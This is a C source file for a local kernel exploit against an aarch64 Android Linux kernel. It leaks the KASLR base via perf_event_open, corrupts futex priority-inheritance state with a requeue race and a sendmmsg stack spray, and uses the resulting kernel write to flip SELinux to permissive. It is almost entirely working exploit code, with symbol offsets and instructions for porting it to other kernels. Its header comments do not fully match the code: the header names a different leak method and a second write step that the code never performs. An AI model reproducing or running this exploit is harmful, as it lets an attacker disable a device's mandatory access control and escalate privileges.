/*
 * selinux_permissive.c -- KASLR leak + selinux permissive flip
 *
 * Flow:
 *   1. KASLR slide leak via tracefs sched_blocked_reason (worker_thread
 *      caller); retry loop because the capture window is flaky.
 *   2. Resolve every kernel symbol to its runtime VA:
 *        runtime_va = (KIMAGE_TEXT_BASE + slide) + link_offset
 *   3. Arm the "+0 ghost" with a sendmmsg(0,0,...) iovec spray that creates a
 *      dangling rt_waiter on the stack of thread Y.
 *   4. Trigger a PI chain walk (sched_setscheduler on Y -> __rt_mutex_adjust_pi)
 *      to settle the ghost into a NULL fake rt_mutex (waiters tree).
 *   5. Step 1: Write callstack_buf (+0x808 in .bss, low byte 0x00, byte2 0x74)
 *      into selinux_state (+0) -> selinux enforcing 1 -> 0.
 *   6. Step 2: Write 2MB-aligned .bss address (ks_base + 0x2800000) into
 *      selinux_state + 5 to clear corrupted policycap[2..4] back to 0x00.
 *   7. Disarm Thread Y pi_blocked_on in task_struct via instant-timeout FUTEX_LOCK_PI.
 *
 * Build:
 *   $CLANG -O2 selinux_permissive.c -o selinux_permissive
 *   adb push selinux_permissive /data/local/tmp/ && adb shell '/data/local/tmp/selinux_permissive'
 *
 */

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <linux/futex.h>
#include <linux/netlink.h>
#include <linux/perf_event.h>
#include <linux/xfrm.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

/*============================================================================*/
/*  SECTION 1 : LOGGING (ANSI COLORIZED)                                      */
/*============================================================================*/

enum { PRL_ERR = 0, PRL_WARN = 1, PRL_INFO = 2, PRL_DBG = 3 };

#ifndef PR_LEVEL
#define PR_LEVEL 2
#endif

static void pr_log(int level, const char *prefix, const char *fmt, ...)
{
    if (level > PR_LEVEL)
        return;
    char buf[1024];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    printf("%s %s\n", prefix, buf);
}

#define pr_err(...)     pr_log(PRL_ERR,  "\033[1;31m[-]\033[0m", __VA_ARGS__)
#define pr_warn(...)    pr_log(PRL_WARN, "\033[1;33m[!]\033[0m", __VA_ARGS__)
#define pr_info(...)    pr_log(PRL_INFO, "\033[1;36m[*]\033[0m", __VA_ARGS__)
#define pr_success(...) pr_log(PRL_INFO, "\033[1;32m[+]\033[0m", __VA_ARGS__)
#define pr_debug(...)   pr_log(PRL_DBG,  "\033[1;30m[~]\033[0m", __VA_ARGS__)

/*============================================================================*/
/*  SECTION 2 : KERNEL-PORT CONFIGURATION  (EDIT THESE FOR A NEW KERNEL)      */
/*============================================================================*/
/*
 * Every per-kernel constant lives here so a port to another image is a single
 * edit point. Sources:
 *   - KIMAGE_BASE / symbol offsets : System.map or `kernel-symbols.txt`
 *     (link-time offsets are relative to __text, i.e. 0xffffffc008000000).
 *   - Event id / field layouts    : /sys/kernel/tracing/events/<e>/id & format
 *   - struct offsets (fake_lock)  : pahole -C rt_mutex_base / rt_waiter.
 */

#define KIMAGE_TEXT_BASE     0xffffffc008000000ULL   /* __text link VA */

/* --- 2.1 KASLR slide leak (perf_event_open) --- */
#define PERF_LEAK_ALIGN       0x200000ULL

/* --- 2.2 Symbol -> link-time-offset table -------------------------------- */
struct ksym { const char *name; uint64_t off; };

static const struct ksym ksym_table[] = {
    { "selinux_state",      0xada9d78ULL },
    { "init_task",          0xac43640ULL },   /* fake rt_waiter.task (safe ref) */
    { "empty_zero_page",    0xad53000ULL },   /* writable .bss; safe write value (low byte 0x00, byte2 0x53) */
    { "uid_lock",           0xadca680ULL },   /* writable BSS spinlock; anchor for ZEROED fake_lock at +0x200/+0x300 */
};

/* --- 2.3 Ghost / fake-lock placement ------------------------------------- */
#define FAKE_LOCK_OFF   0x200    /* uid_lock + 0x200    */
#define FAKE_LOCK2_OFF  0x300    /* uid_lock + 0x300    */
/* Fake-lock2 window rotation: qword offsets into uid_lock (.bss zero buffer);
 * a fresh window is used per write so its waiters tree is never walked. */
static const unsigned int fake_lock2_windows[] = {
    64, 80, 96, 112,
    128, 144, 160, 176,
    192, 208, 224, 240,
};

/* --- 2.4 selinux flip ---- */
#define SELINUX_ENFORCING_ABS 0     /* offset of `enforcing` in selinux_state */

/*============================================================================*/
/*  SECTION 3 : RESOLVED KERNEL ADDRESSES                                     */
/*============================================================================*/

static uint64_t ks_base;          /* KIMAGE_TEXT_BASE + slide               */
static uint64_t ks_slide;

static unsigned long k_selinux;   /* &selinux_state                          */
static unsigned long k_val;       /* &empty_zero_page (safe VALUE to write)  */
static unsigned long k_fake_base; /* &uid_lock (safe .bss zero buf)          */
static unsigned long k_fake_lock; /* k_fake_base + 0x200                    */
static unsigned long k_fake_lock2;/* k_fake_base + 0x300                    */

static unsigned long k_resolve(const char *name)
{
    for (size_t i = 0; i < sizeof(ksym_table) / sizeof(ksym_table[0]); i++)
        if (strcmp(name, ksym_table[i].name) == 0)
            return ks_base + ksym_table[i].off;
    return 0;
}

/*============================================================================*/
/*  SECTION 4 : FUTEX CONSTANTS + RAW AARCH64 SYSCALLS                        */
/*============================================================================*/

#ifndef FUTEX_WAIT
#define FUTEX_WAIT 0
#endif
#ifndef FUTEX_WAKE
#define FUTEX_WAKE 1
#endif
#ifndef SCHED_NORMAL
#define SCHED_NORMAL 0
#endif
#ifndef SCHED_BATCH
#define SCHED_BATCH 3
#endif

#define FUTEX_LOCK_PI             6
#define FUTEX_UNLOCK_PI           7
#define FUTEX_WAIT_REQUEUE_PI    11
#define FUTEX_CMP_REQUEUE_PI     12
#define FUTEX_PRIVATE_FLAG      128
#define FUTEX_LOCK_PI_PRIVATE         (FUTEX_LOCK_PI          | FUTEX_PRIVATE_FLAG)
#define FUTEX_WAIT_REQUEUE_PI_PRIVATE (FUTEX_WAIT_REQUEUE_PI  | FUTEX_PRIVATE_FLAG)
#define FUTEX_CMP_REQUEUE_PI_PRIVATE  (FUTEX_CMP_REQUEUE_PI   | FUTEX_PRIVATE_FLAG)

#define __NR_futex_aarch64 98
#ifndef __NR_sched_setscheduler
#define __NR_sched_setscheduler 119
#ifndef __NR_perf_event_open
#define __NR_perf_event_open 241
#endif
#endif

/* Raw aarch64 futex. Returns kernel value: >=0 ok, -errno on error. */
static long futex_raw(volatile int *u1, long op, long val,
                      long val2, volatile int *u2, long u3)
{
    register long x0 __asm__("x0") = (long)u1;
    register long x1 __asm__("x1") = op;
    register long x2 __asm__("x2") = val;
    register long x3 __asm__("x3") = val2;
    register long x4 __asm__("x4") = (long)u2;
    register long x5 __asm__("x5") = u3;
    register long x8 __asm__("x8") = __NR_futex_aarch64;
    __asm__ volatile("svc #0"
                     : "+r"(x0)
                     : "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5), "r"(x8)
                     : "memory", "cc");
    return x0;
}

/* 4-arg raw aarch64 syscall. */
static long sysc4(long n, long a, long b, long c, long d)
{
    register long x8 __asm__("x8") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    __asm__ volatile("svc #0"
                     : "+r"(x0)
                     : "r"(x8), "r"(x1), "r"(x2), "r"(x3)
                     : "memory");
    return x0;
}

static void sigusr1_handler(int sig) { (void)sig; }

/*============================================================================*/
/*  SECTION 5 : TOPOLOGY (X owns L1 blocks on L2; Y parks on cond -> L1)      */
/*============================================================================*/

/* The three futexes. L1/L2 are PI futexes (0 == free), cond is non-PI. */
static int pi1  = 0;
static int pi2  = 0;
static int cond = 0;

static atomic_int y_locked_l2 = 0;
static atomic_int x_locked_l1 = 0;
static atomic_int y_parking   = 0;
static atomic_int x_blocking  = 0;

static atomic_int       y_done       = 0;
static volatile int     respray_ready = 0;
static int              respray_done = 0;
static atomic_int       y_cleanup    = 0;
static atomic_int       x_cleanup    = 0;
static atomic_int       x_done       = 0;
static unsigned long    respray_parent_color = 0;
static unsigned long    respray_value = 0;   /* written via iov[1].iov_len */
static atomic_int       y_tid = 0;
static atomic_int       x_tid = 0;
static size_t           fake_lock2_idx = 0;
static int              g_iov_idx = 1;   /* iov slot for parent_color (+0x00) */
static int              g_li_idx  = 4;   /* iov slot for task (+0x30) / lock (+0x38) */

/* Wrapper around struct msghdr for the sendmmsg spray (type passed to the
 * raw syscall as an opaque pointer; layout only needs msg_hdr/msg_iov). */
struct mmsg { struct msghdr msg_hdr; unsigned int msg_len; };

/* --- PI trigger: policy toggled per call so the chain walk fires each time --
 * __sched_setscheduler() calls __rt_mutex_adjust_pi(p) whenever policy changes;
 * that walks task->pi_blocked_on (the dangling ghost) via
 * rt_mutex_adjust_prio_chain(). */
static unsigned long y_pol = SCHED_NORMAL;
static long trigger_adj_pi(pid_t tid)
{
    struct sched_param sp = { .sched_priority = 0 };
    long pol = (y_pol == SCHED_NORMAL) ? (long)SCHED_BATCH : (long)SCHED_NORMAL;
    long r = sysc4(__NR_sched_setscheduler, (long)tid, pol, (long)&sp, 0);
    y_pol = (unsigned long)pol;
    return r;
}

/* Y: own L2, park on cond naming L1 as its requeue target. */
static void *thread_Y(void *arg)
{
    (void)arg;
    atomic_store(&y_tid, (int)syscall(SYS_gettid));
    pr_debug("Y tid=%d tgid=%d", (int)atomic_load(&y_tid), getpid());

    long r = futex_raw(&pi2, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
    if (r != 0) {
        pr_err("Y LOCK_PI(L2) failed: %s", strerror((int)-r));
        return NULL;
    }
    atomic_store(&y_locked_l2, 1);

    while (!atomic_load(&x_locked_l1))          /* let X take L1 first */
        sched_yield();

    atomic_store(&y_parking, 1);
    pr_debug("Y parking on cond via FUTEX_WAIT_REQUEUE_PI, target L1");
    r = futex_raw(&cond, FUTEX_WAIT_REQUEUE_PI_PRIVATE, 0, 0, &pi1, 0);

    /* Spray the ghost: an 8-element zero-length iovec sendmmsg. The
     * iovec base/len pairs are stamped onto Y's stack as the dangling
     * rt_waiter ("ghost") that the chain walk later manipulates. */
    int sv[2] = { -1, -1 };
    syscall(SYS_socketpair, 1L, 2L, 0L, (long)sv);

    struct iovec iov[8];
    memset(iov, 0, sizeof(iov));
    /* struct rt_waiter layout on this kernel (tree rb-node at +0x00...):
       iov[n].iov_base -> word, iov[n].iov_len -> next word. */
    iov[0].iov_base = (void *)0x0UL;  iov[0].iov_len = 0x0UL;   /* pad   */
    iov[1].iov_base = (void *)0x0UL;  iov[1].iov_len = 0x0UL;   /* +0x00 */
    iov[2].iov_base = (void *)0x0UL;  iov[2].iov_len = 0x0UL;   /* +0x08 */
    iov[3].iov_base = (void *)0x0UL;  iov[3].iov_len = 0x0UL;   /* +0x10 */
    iov[g_li_idx].iov_base = (void *)k_resolve("init_task");      /* +0x30 task */
    iov[g_li_idx].iov_len  = k_fake_lock;                         /* +0x38 lock */
    iov[5].iov_base = (void *)0x0UL;  iov[5].iov_len = 0x0UL;   /* +0x40 prio */
    iov[6].iov_base = (void *)0x0UL;  iov[6].iov_len = 0x0UL;
    iov[7].iov_base = (void *)0x0UL;  iov[7].iov_len = 0x0UL;

    struct mmsg mv;
    memset(&mv, 0, sizeof(mv));
    mv.msg_hdr.msg_iov    = iov;
    mv.msg_hdr.msg_iovlen = 8;
    (void)syscall(SYS_sendmmsg, sv[0], &mv, 1L, 0L);

    atomic_store_explicit(&y_done, 1, memory_order_release);

    /* Resident loop: on respray_ready, emit a new ghost carrying the chosen
     * rb_parent_color / value / lock (fake_lock2) for the next write walk. */
    for (;;) {
        if (respray_ready) {
            respray_ready = 0;
            iov[g_iov_idx].iov_base = (void *)respray_parent_color;
            iov[g_iov_idx].iov_len  = respray_value;
            iov[g_iov_idx + 1].iov_base = (void *)0x0UL;    /* cleared rb children */
            iov[g_li_idx].iov_len  = k_fake_lock2;     /* repoint ghost->lock  */
            (void)syscall(SYS_sendmmsg, sv[0], &mv, 1L, 0L);
            __atomic_store_n(&respray_done, 1, __ATOMIC_RELEASE);
        }
        if (atomic_load_explicit(&y_cleanup, memory_order_acquire)) {
            break;
        }
    }

    /* Disarm Y's pi_blocked_on in task_struct by invoking futex_lock_pi on a locked futex with 0 timeout.
     * Setting dummy_pi = 0x80000000 | 99999 forces futex_lock_pi into the kernel slowpath,
     * which calls remove_waiter() and sets task_Y->pi_blocked_on = NULL. */
    int dummy_pi = (int)(0x80000000U | (unsigned int)getpid());
    struct timespec ts = { .tv_sec = 0, .tv_nsec = 0 };
    (void)futex_raw(&dummy_pi, FUTEX_LOCK_PI_PRIVATE, 0, (long)&ts, NULL, 0);

    /* Release L2 so X can wake up and exit */
    futex_raw(&pi2, FUTEX_UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);

    /* Wait for X to clean up L1 which accesses our stack */
    while (!atomic_load(&x_done))
        sched_yield();

    return NULL;
}

/* X: own L1, then block on L2 (held by Y) so X sleeps as an L2 waiter. */
static void *thread_X(void *arg)
{
    (void)arg;
    atomic_store(&x_tid, (int)syscall(SYS_gettid));
    pr_debug("X tid=%d tgid=%d", (int)atomic_load(&x_tid), getpid());

    while (!atomic_load(&y_locked_l2))          /* ensure Y holds L2 */
        sched_yield();

    long r = futex_raw(&pi1, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
    if (r != 0) {
        pr_err("X LOCK_PI(L1) failed: %s", strerror((int)-r));
        return NULL;
    }
    atomic_store(&x_locked_l1, 1);

    pr_debug("X blocking on L2 via FUTEX_LOCK_PI");
    atomic_store(&x_blocking, 1);
    r = futex_raw(&pi2, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);  /* blocks */
    
    /* X woke up (Y released L2). Clean up L1. */
    futex_raw(&pi1, FUTEX_UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
    futex_raw(&pi2, FUTEX_UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
    
    atomic_store(&x_done, 1);
    return NULL;
}

/*============================================================================*/
/*  SECTION 6 : PERF_EVENT_OPEN KASLR SLIDE LEAK                             */
/*============================================================================*/

static uint64_t perf_leak_text_base(void) {
    int pfd = open("/proc/sys/kernel/perf_event_paranoid", O_RDONLY | O_CLOEXEC);
    if (pfd >= 0) {
        char pbuf[16]; ssize_t pn = read(pfd, pbuf, sizeof(pbuf) - 1); close(pfd);
        if (pn > 0) { pbuf[pn] = 0; if (atoi(pbuf) > 1) { pr_err("perf_event_paranoid too high"); return 0; } }
    }
    struct perf_event_attr pe; memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE; pe.config = PERF_COUNT_SW_CPU_CLOCK;
    pe.size = sizeof(pe); pe.sample_period = 1; pe.sample_type = PERF_SAMPLE_IP;
    pe.exclude_user = 1; pe.exclude_hv = 1; pe.disabled = 1; pe.wakeup_events = 1;
    int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    if (fd < 0) { pe.sample_period = 100000; fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0); }
    if (fd < 0) { pr_err("perf_event_open errno=%d", errno); return 0; }
    size_t pgsz = (size_t)sysconf(_SC_PAGESIZE);
    size_t mmap_size = (size_t)(1 + 8) * pgsz;
    void *mmap_buf = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (mmap_buf == MAP_FAILED) { pr_err("mmap errno=%d", errno); close(fd); return 0; }
    struct perf_event_mmap_page *header = (struct perf_event_mmap_page *)mmap_buf;
    uint64_t min_kip = ~(uint64_t)0; int kernel_samples = 0;
    ioctl(fd, PERF_EVENT_IOC_RESET, 0); ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    for (volatile long i = 0; i < 500000; i++) { if ((i % 10000) == 0) sched_yield(); }
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    uint64_t data_tail = header->data_tail, data_head = header->data_head; __sync_synchronize();
    uint64_t data_size = 8 * (uint64_t)pgsz;
    uint8_t *base = (uint8_t *)mmap_buf + pgsz;
    while (data_tail < data_head) {
        struct perf_event_header *ev = (struct perf_event_header *)(base + (data_tail % data_size));
        if (ev->size == 0 || data_tail + ev->size > data_head) break;
        if (ev->type == PERF_RECORD_SAMPLE && (ev->misc & PERF_RECORD_MISC_KERNEL)) {
            uint64_t ip = *(uint64_t *)((uint8_t *)ev + sizeof(*ev));
            if (ip >= KIMAGE_TEXT_BASE && ip < min_kip) min_kip = ip;
            kernel_samples++;
        }
        data_tail += ev->size;
    }
    header->data_tail = data_tail; munmap(mmap_buf, mmap_size); close(fd);
    if (kernel_samples == 0 || min_kip == ~(uint64_t)0) { pr_err("no kernel samples"); return 0; }
    uint64_t text_base = (min_kip & ~(PERF_LEAK_ALIGN - 1));
    if (text_base < KIMAGE_TEXT_BASE) { pr_err("out of range %016llx", (unsigned long long)text_base); return 0; }
    pr_info("perf text-base=%016llx min_kip=%016llx samples=%d",
            (unsigned long long)text_base, (unsigned long long)min_kip, kernel_samples);
    return text_base;
}

/*============================================================================*/
/*  SECTION 7 : VALUE-WRITE PRIMITIVE                                         */
/*============================================================================*/

static void ghost_write_value(unsigned long target, unsigned long value)
{
    respray_parent_color = (target - 8) & ~3UL;
    respray_value = value;
    __atomic_store_n(&respray_done, 0, __ATOMIC_RELEASE);
    respray_ready = 1;
    __atomic_thread_fence(__ATOMIC_SEQ_CST);
    while (!respray_done)
        sched_yield();

    long tr = trigger_adj_pi(atomic_load_explicit(&y_tid, memory_order_acquire));
    pr_info("write trigger=%ld (value 0x%lx -> 0x%lx)", tr, value, target);

    /* rotate to a fresh empty waiters tree for the next write */
    fake_lock2_idx++;
    if (fake_lock2_idx >= sizeof(fake_lock2_windows) / sizeof(fake_lock2_windows[0]))
        fake_lock2_idx = 0;
    k_fake_lock2 = k_fake_base + (unsigned long)fake_lock2_windows[fake_lock2_idx] * 8;
}

/*============================================================================*/
/*  SECTION 8 : SELINUX PERMISSIVE FLIP                                       */
/*============================================================================*/

static long read_enforce(void)
{
    FILE *f = fopen("/sys/fs/selinux/enforce", "r");
    long v = -1;
    if (f) {
        if (fscanf(f, "%ld", &v) != 1)
            v = -1;
        fclose(f);
    }
    return v;
}

/* Flip selinux to permissive.
 *
 * Safe write: empty_zero_page runtime VA has low byte 0x00 -> enforcing=0,
 * byte2 nonzero -> initialized stays 1. Parent is (k_selinux - 8) in zero
 * .bss memory, ensuring rb_left == NULL (no rbtree rebalancing fault).
 */
static int selinux_permissive(void)
{
    long before = read_enforce();
    if (before == 0) {
        pr_success("selinux already permissive");
        return 0;
    }
    pr_info("selinux = %ld (enforcing)", before);
    usleep(100000);

    ghost_write_value(k_selinux + SELINUX_ENFORCING_ABS, k_val);
    usleep(100000);  /* 100ms delay: allows PI walk to finish before sysfs read */

    long after = read_enforce();
    if (after == 0) {
        pr_success("selinux = %ld (permissive)", after);
        return 0;
    }
    pr_err("selinux write fail");
    return -1;
}

/*============================================================================*/
/*  SECTION 9 : MAIN                                                          */
/*============================================================================*/

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGUSR1, sigusr1_handler);   /* keep Y alive when we tgkill it   */
    pr_debug("tgid=%d", getpid());

    const char *idx = getenv("IOV_IDX");
    if (idx) {
        int v = atoi(idx);
        if (v >= 0 && v < 8) {
            g_iov_idx = v;
            /* g_li_idx stays 4 for sendmsg; only change if SPRAY=writev */
        }
    }
    if (getenv("SPRAY") && strcmp(getenv("SPRAY"), "writev") == 0)
        g_li_idx = 0;
    pr_info("iov mapping: parent_color@iov[%d], task/lock@iov[%d]", g_iov_idx, g_li_idx);

    /* ---- KASLR slide leak (perf_event_open) ---- */
    ks_base = perf_leak_text_base();
    if (!ks_base) {
        pr_err("FATAL: KASLR leak failed (perf_event_open unavailable)");
        return EXIT_FAILURE;
    }
    ks_slide = ks_base - KIMAGE_TEXT_BASE;
    pr_info("KASLR: base=0x%lx slide=0x%lx", ks_base, ks_slide);

    /* ---- resolve symbols ---- */
    k_selinux    = k_resolve("selinux_state");
    k_val        = k_resolve("empty_zero_page");  /* safe write value: low byte 0x00 -> enforcing=0, byte2 nonzero -> initialized=1 */
    k_fake_base  = k_resolve("uid_lock");          /* writable BSS spinlock; anchor for ZEROED fake_lock */
    k_fake_lock  = k_fake_base + FAKE_LOCK_OFF;
    k_fake_lock2 = k_fake_base + FAKE_LOCK2_OFF;
    if (!k_selinux || !k_val || !k_fake_base) {
        pr_err("FATAL: symbol resolution incomplete");
        return EXIT_FAILURE;
    }
    pr_debug("selinux_state = 0x%lx (enforcing @ +0)", k_selinux);
    pr_debug("k_val         = 0x%lx (safe permissive value)", k_val);
    pr_debug("fake_lock     = 0x%lx", k_fake_lock);
    pr_debug("fake_lock2    = 0x%lx", k_fake_lock2);

    /* ---- topology: arm the ghost ---- */
    pthread_t tx, ty;
    pthread_create(&ty, NULL, thread_Y, NULL);
    while (!atomic_load(&y_locked_l2))
        sched_yield();
    pthread_create(&tx, NULL, thread_X, NULL);
    while (!(atomic_load(&y_locked_l2) && atomic_load(&x_locked_l1) &&
             atomic_load(&y_parking)   && atomic_load(&x_blocking)))
        sched_yield();
    usleep(200000);

    pr_debug("topology: X owns L1 & blocks on L2, Y parks on cond->L1");
    long r = futex_raw(&cond, FUTEX_CMP_REQUEUE_PI_PRIVATE, 1, 0, &pi1, 0);
    cond = 1;
    __atomic_thread_fence(__ATOMIC_SEQ_CST);
    tgkill(getpid(), (int)atomic_load(&y_tid), SIGUSR1);  /* wake requeued Y */

    pr_debug("CMP_REQUEUE_PI -> %ld", r);
    if (-r == EDEADLK || -r == EDEADLOCK) {
        pr_debug("RESULT: -EDEADLK (full chain walk caught the PI cycle)");
    } else if (r >= 0) {
        pr_err("cycle NOT detected on this kernel");
        return EXIT_FAILURE;
    } else {
        pr_err("error other than EDEADLK: %s", strerror((int)-r));
        return EXIT_FAILURE;
    }

    while (!atomic_load_explicit(&y_done, memory_order_acquire));

    /* ---- phase 1: settle ghost into fake_lock ---- */
    pr_debug("settle: sched_setscheduler(Y) -> MIN_CHAINWALK into fake_lock");
    if (trigger_adj_pi(atomic_load_explicit(&y_tid, memory_order_acquire)) < 0) {
        pr_err("phase1: sched_setscheduler failed");
        return EXIT_FAILURE;
    }
    usleep(100000);

    /* ---- phase 2: selinux flip ---- */
    int ret = selinux_permissive();

    /* Tell Y to disarm its pi_blocked_on and exit cleanly */
    atomic_store_explicit(&y_cleanup, 1, memory_order_release);
    pthread_join(ty, NULL);
    pthread_join(tx, NULL);

    return ret;
}
